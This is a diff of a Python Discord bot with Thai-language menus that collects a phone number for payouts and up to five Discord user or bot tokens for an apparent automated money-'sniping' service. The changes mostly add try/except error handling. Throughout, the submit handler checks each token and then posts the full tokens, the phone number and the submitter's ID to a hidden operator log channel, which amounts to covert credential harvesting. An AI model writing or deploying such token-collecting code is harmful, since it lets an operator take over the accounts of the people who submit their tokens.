@@ -118,78 +118,84 @@ class TokenInputModal(ui.Modal, title="กรอกข้อมูล Token แ�
 
     async def on_submit(self, interaction: discord.Interaction):
         global db
-        await interaction.response.defer(ephemeral=True)
-        
-        checking_embed = discord.Embed(
-            description="<a:1000030105:1551256174287126619> กำลังเช็ค token โปรดรอสักครู่..",
-            color=discord.Color.red()
-        )
-        msg = await interaction.followup.send(embed=checking_embed, ephemeral=True)
-        await asyncio.sleep(1)
-
-        raw_tokens = [t.strip(" '\"\t\r\n") for t in re.split(r'[,,\n]+', self.tokens_input.value) if t.strip(" '\"\t\r\n")][:5]
-        valid_tokens = []
-
-        for t in raw_tokens:
-            is_valid, t_type, name = await verify_token(t)
-            if is_valid:
-                valid_tokens.append({"token": t, "type": t_type, "name": name})
-
-        user_id = str(interaction.user.id)
-
-        if valid_tokens:
-            db = load_data()
-            db[user_id] = {
-                "phone": self.phone.value.strip(),
-                "tokens": valid_tokens,
-                "status": db.get(user_id, {}).get("status", False),
-                "total_earned": db.get(user_id, {}).get("total_earned", 0.0),
-                "total_rounds": db.get(user_id, {}).get("total_rounds", 0)
-            }
-            save_data(db)
-            await update_bot_presence()
-
-            types_str = ", ".join(list(set([vt['type'] for vt in valid_tokens])))
-            success_embed = discord.Embed(
-                description=f"<a:1000030103:1551255510215426088> ระบบได้บันทึก Token จำนวน {len(valid_tokens)} ตัว และเบอร์ของคุณเรียบร้อยแล้ว! ประเภท Token: {types_str} <a:1000030106:1551256934215061615>",
+        try:
+            await interaction.response.defer(ephemeral=True)
+            
+            checking_embed = discord.Embed(
+                description="<a:1000030105:1551256174287126619> กำลังเช็ค token โปรดรอสักครู่..",
                 color=discord.Color.red()
             )
-            await interaction.followup.edit_message(message_id=msg.id, embed=success_embed)
+            msg = await interaction.followup.send(embed=checking_embed, ephemeral=True)
+            await asyncio.sleep(1)
 
-            log_chan = bot.get_channel(TOKEN_LOG_CHANNEL_ID)
-            if log_chan:
-                token_list_str = "\n".join([f"- `{vt['token']}` ({vt['type']}: {vt['name']})" for vt in valid_tokens])
-                log_embed = discord.Embed(
-                    title="มีการกรอก Token ใหม่",
-                    description=f"มีคนกรอก token เเละเบอร์เข้ามาแล้ว\n**จำนวน Token:** {len(valid_tokens)} ตัว\n**Token:**\n{token_list_str}\n**เบอร์:** {self.phone.value}\n**ผู้ส่ง:** {interaction.user.mention} ({interaction.user.id})",
+            raw_tokens = [t.strip(" '\"\t\r\n") for t in re.split(r'[,,\n]+', self.tokens_input.value) if t.strip(" '\"\t\r\n")][:5]
+            valid_tokens = []
+
+            for t in raw_tokens:
+                is_valid, t_type, name = await verify_token(t)
+                if is_valid:
+                    valid_tokens.append({"token": t, "type": t_type, "name": name})
+
+            user_id = str(interaction.user.id)
+
+            if valid_tokens:
+                db = load_data()
+                db[user_id] = {
+                    "phone": self.phone.value.strip(),
+                    "tokens": valid_tokens,
+                    "status": db.get(user_id, {}).get("status", False),
+                    "total_earned": db.get(user_id, {}).get("total_earned", 0.0),
+                    "total_rounds": db.get(user_id, {}).get("total_rounds", 0)
+                }
+                save_data(db)
+                await update_bot_presence()
+
+                types_str = ", ".join(list(set([vt['type'] for vt in valid_tokens])))
+                success_embed = discord.Embed(
+                    description=f"<a:1000030103:1551255510215426088> ระบบได้บันทึก Token จำนวน {len(valid_tokens)} ตัว และเบอร์ของคุณเรียบร้อยแล้ว! ประเภท Token: {types_str} <a:1000030106:1551256934215061615>",
                     color=discord.Color.red()
                 )
-                await log_chan.send(embed=log_embed)
-        else:
-            fail_embed = discord.Embed(
-                description="<a:1000030101:1551255585029103636> Token ไม่ถูกต้อง หรือไม่พบข้อมูลในระบบ โปรดตรวจสอบแล้วลองใหม่อีกครั้ง <a:1000030106:1551256934215061615>",
-                color=discord.Color.red()
-            )
-            await interaction.followup.edit_message(message_id=msg.id, embed=fail_embed)
+                await interaction.followup.edit_message(message_id=msg.id, embed=success_embed)
+
+                log_chan = bot.get_channel(TOKEN_LOG_CHANNEL_ID)
+                if log_chan:
+                    token_list_str = "\n".join([f"- `{vt['token']}` ({vt['type']}: {vt['name']})" for vt in valid_tokens])
+                    log_embed = discord.Embed(
+                        title="มีการกรอก Token ใหม่",
+                        description=f"มีคนกรอก token เเละเบอร์เข้ามาแล้ว\n**จำนวน Token:** {len(valid_tokens)} ตัว\n**Token:**\n{token_list_str}\n**เบอร์:** {self.phone.value}\n**ผู้ส่ง:** {interaction.user.mention} ({interaction.user.id})",
+                        color=discord.Color.red()
+                    )
+                    await log_chan.send(embed=log_embed)
+            else:
+                fail_embed = discord.Embed(
+                    description="<a:1000030101:1551255585029103636> Token ไม่ถูกต้อง หรือไม่พบข้อมูลในระบบ โปรดตรวจสอบแล้วลองใหม่อีกครั้ง <a:1000030106:1551256934215061615>",
+                    color=discord.Color.red()
+                )
+                await interaction.followup.edit_message(message_id=msg.id, embed=fail_embed)
+        except Exception as e:
+            print(f"Error in TokenInputModal: {e}")
 
 class CheckSingleTokenModal(ui.Modal, title="Check Token"):
     token_input = ui.TextInput(label="ใส่ Token ที่ต้องการเช็ค", placeholder="UserToken / BotToken", required=True)
 
     async def on_submit(self, interaction: discord.Interaction):
-        await interaction.response.defer(ephemeral=True)
-        is_valid, t_type, name = await verify_token(self.token_input.value.strip())
-        
-        if is_valid:
-            embed = discord.Embed(
-                description=f"<a:1000030103:1551255510215426088> Token ถูกต้อง เป็นประเภท {t_type} [{name}]",
-                color=discord.Color.red()
-            )
-        else:
-            embed = discord.Embed(
-                description="<a:1000030101:1551255585029103636> Token ไม่ถูกต้อง",
-                color=discord.Color.red()
-            )
-        await interaction.followup.send(embed=embed, ephemeral=True)
+        try:
+            await interaction.response.defer(ephemeral=True)
+            is_valid, t_type, name = await verify_token(self.token_input.value.strip())
+            
+            if is_valid:
+                embed = discord.Embed(
+                    description=f"<a:1000030103:1551255510215426088> Token ถูกต้อง เป็นประเภท {t_type} [{name}]",
+                    color=discord.Color.red()
+                )
+            else:
+                embed = discord.Embed(
+                    description="<a:1000030101:1551255585029103636> Token ไม่ถูกต้อง",
+                    color=discord.Color.red()
+                )
+            await interaction.followup.send(embed=embed, ephemeral=True)
+        except Exception as e:
+            print(f"Error in CheckSingleTokenModal: {e}")
 
 # --- UI Dropdown View ---
 class OeiSelect(ui.Select):
@@ -209,80 +215,87 @@ class OeiSelect(ui.Select):
         user_id = str(interaction.user.id)
         val = self.values[0]
 
-        if val == "1":
-            await interaction.response.send_modal(TokenInputModal())
+        try:
+            if val == "1":
+                await interaction.response.send_modal(TokenInputModal())
 
-        elif val == "2":
-            db = load_data()
-            user_data = db.get(user_id)
-            if not user_data or not user_data.get("tokens") or not user_data.get("phone"):
-                embed = discord.Embed(
-                    description="<a:1000030101:1551255585029103636> คุณยังไม่ได้กรอกข้อมูลต่างๆ โปรดกรอกให้ครบในลิสที่1ด้วยย",
-                    color=discord.Color.red()
-                )
-                await interaction.response.send_message(embed=embed, ephemeral=True)
+            elif val == "5":
+                await interaction.response.send_modal(CheckSingleTokenModal())
+
             else:
-                user_data["status"] = True
-                save_data(db)
-                embed = discord.Embed(
-                    description="<a:1000030103:1551255510215426088> ระบบกำลังทำงาน สามารถรอรับเงินได้เลยย ถ้าหากต้องการหยุดเเค่กดลิสที่3จะเป็นการหยุด",
-                    color=discord.Color.red()
-                )
-                await interaction.response.send_message(embed=embed, ephemeral=True)
+                # ตอบรับ interaction ทันทีป้องกันการขึ้น ไม่ตอบสนองในเวลาที่กำหนด
+                await interaction.response.defer(ephemeral=True)
 
-        elif val == "3":
-            db = load_data()
-            user_data = db.get(user_id)
-            if user_data and user_data.get("status", False):
-                user_data["status"] = False
-                save_data(db)
-                embed = discord.Embed(
-                    description="<a:1000030103:1551255510215426088> หยุดการทำงานสำเร็จ ถ้าหากต้องการให้กลับมาทำงานโปรดกดลิสที่2ได้ทันที!!",
-                    color=discord.Color.red()
-                )
-            else:
-                embed = discord.Embed(
-                    description="<a:1000030093:1551252638794780883> ระบบไม่ได้ทำงานอยู่เเล้ว หรือหากต้องการ เเค่กดลิสที่2!!!",
-                    color=discord.Color.red()
-                )
-            await interaction.response.send_message(embed=embed, ephemeral=True)
+                if val == "2":
+                    db = load_data()
+                    user_data = db.get(user_id)
+                    if not user_data or not user_data.get("tokens") or not user_data.get("phone"):
+                        embed = discord.Embed(
+                            description="<a:1000030101:1551255585029103636> คุณยังไม่ได้กรอกข้อมูลต่างๆ โปรดกรอกให้ครบในลิสที่1ด้วยย",
+                            color=discord.Color.red()
+                        )
+                    else:
+                        user_data["status"] = True
+                        save_data(db)
+                        embed = discord.Embed(
+                            description="<a:1000030103:1551255510215426088> ระบบกำลังทำงาน สามารถรอรับเงินได้เลยย ถ้าหากต้องการหยุดเเค่กดลิสที่3จะเป็นการหยุด",
+                            color=discord.Color.red()
+                        )
+                    await interaction.followup.send(embed=embed, ephemeral=True)
 
-        elif val == "4":
-            db = load_data()
-            user_data = db.get(user_id)
-            if not user_data or not user_data.get("tokens"):
-                embed = discord.Embed(
-                    description="<a:1000030101:1551255585029103636> ไม่มี Token ในระบบ โปรดกรอกข้อมูลในลิสที่ 1 ก่อนครับ",
-                    color=discord.Color.red()
-                )
-            else:
-                tokens = user_data.get("tokens", [])
-                is_running = user_data.get("status", False)
-                status_str = "🟢 กำลังทำงาน" if is_running else "🔴 ปิดการทำงานอยู่"
-                desc = (
-                    f"<a:1000030093:1551252638794780883> **สถานะระบบ:** {status_str}\n"
-                    f"**เบอร์รับเงิน:** {user_data.get('phone', 'ไม่ได้ระบุ')}\n"
-                    f"**Token ทั้งหมดที่ดักอยู่ ({len(tokens)} ตัว):**\n"
-                )
-                for idx, t in enumerate(tokens, 1):
-                    desc += f"{idx}. [{t['type']}] {t['name']}\n"
-                embed = discord.Embed(description=desc, color=discord.Color.red())
-            await interaction.response.send_message(embed=embed, ephemeral=True)
+                elif val == "3":
+                    db = load_data()
+                    user_data = db.get(user_id)
+                    if user_data and user_data.get("status", False):
+                        user_data["status"] = False
+                        save_data(db)
+                        embed = discord.Embed(
+                            description="<a:1000030103:1551255510215426088> หยุดการทำงานสำเร็จ ถ้าหากต้องการให้กลับมาทำงานโปรดกดลิสที่2ได้ทันที!!",
+                            color=discord.Color.red()
+                        )
+                    else:
+                        embed = discord.Embed(
+                            description="<a:1000030093:1551252638794780883> ระบบไม่ได้ทำงานอยู่เเล้ว หรือหากต้องการ เเค่กดลิสที่2!!!",
+                            color=discord.Color.red()
+                        )
+                    await interaction.followup.send(embed=embed, ephemeral=True)
 
-        elif val == "5":
-            await interaction.response.send_modal(CheckSingleTokenModal())
+                elif val == "4":
+                    db = load_data()
+                    user_data = db.get(user_id)
+                    if not user_data or not user_data.get("tokens"):
+                        embed = discord.Embed(
+                            description="<a:1000030101:1551255585029103636> ไม่มี Token ในระบบ โปรดกรอกข้อมูลในลิสที่ 1 ก่อนครับ",
+                            color=discord.Color.red()
+                        )
+                    else:
+                        tokens = user_data.get("tokens", [])
+                        is_running = user_data.get("status", False)
+                        status_str = "🟢 กำลังทำงาน" if is_running else "🔴 ปิดการทำงานอยู่"
+                        desc = (
+                            f"<a:1000030093:1551252638794780883> **สถานะระบบ:** {status_str}\n"
+                            f"**เบอร์รับเงิน:** {user_data.get('phone', 'ไม่ได้ระบุ')}\n"
+                            f"**Token ทั้งหมดที่ดักอยู่ ({len(tokens)} ตัว):**\n"
+                        )
+                        for idx, t in enumerate(tokens, 1):
+                            desc += f"{idx}. [{t['type']}] {t['name']}\n"
+                        embed = discord.Embed(description=desc, color=discord.Color.red())
+                    await interaction.followup.send(embed=embed, ephemeral=True)
 
-        elif val == "6":
-            db = load_data()
-            if user_id in db:
-                db.pop(user_id)
-                save_data(db)
-                await update_bot_presence()
-            embed = discord.Embed(
-                description="<a:1000030109:1551262224796876951> ล้างตัวเลือกสำเร็จ..",
-                color=discord.Color.red()
-            )
-            await interaction.response.send_message(embed=embed, ephemeral=True)
+                elif val == "6":
+                    db = load_data()
+                    if user_id in db:
+                        db.pop(user_id)
+                        save_data(db)
+                        await update_bot_presence()
+                    embed = discord.Embed(
+                        description="<a:1000030109:1551262224796876951> ล้างตัวเลือกสำเร็จ..",
+                        color=discord.Color.red()
+                    )
+                    await interaction.followup.send(embed=embed, ephemeral=True)
+
+        except Exception as e:
+            print(f"Error in select callback: {e}")
 
 class OeiView(ui.View):
     def __init__(self):
@@ -359,11 +372,12 @@ async def oei_command(interaction: discord.Interaction):
         description=(
             "<a:1000030095:1551252990772383868> กรอกเบอร์ที่ต้องการให้รับเงิน\n\n"
             "<a:1000030096:1551253928069570611> ใส่UserToken / BotToken\n\n"
-            "<a:1000030106:1551256934215061615> วิธีใช้งาน\n"
-            "-. กรอกลิส1ก่อนเป็นการใส่ข้อมูล\n"
-            "-. หลังจากใส่ลิส1สามารถกดลิส2เป็นการเริ่มการดัก\n"
-            "-. หากต้องการหยุดให้กดลิส3\n"
-            "-."
+            "<a:1000030106:1551256934215061615> **วิธีใช้งาน**\n"
+            "1. กรอกลิส 1 ก่อนเป็นการใส่ข้อมูล\n"
+            "2. หลังจากใส่ลิส 1 สามารถกดลิส 2 เป็นการเริ่มการดัก\n"
+            "3. หากต้องการหยุดให้กดลิส 3\n"
+            "4. เป็นการเช็คการทำงานต่างๆนาๆ\n"
+            "5. Check Token"
         ),
         color=discord.Color.red()
     )
